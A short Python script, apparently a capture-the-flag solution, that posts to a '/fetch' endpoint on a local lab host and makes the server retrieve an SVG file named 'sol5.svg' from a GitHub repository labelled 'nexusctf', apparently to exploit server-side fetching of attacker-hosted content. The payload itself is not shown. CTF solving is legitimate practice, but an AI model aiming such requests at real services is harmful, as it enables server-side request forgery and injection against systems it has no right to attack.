import requests

url = "http://192.168.64.2:5000/fetch"
payload = {
    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol5.svg"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
r = requests.post(url, headers=headers, data=payload)


print(r.text)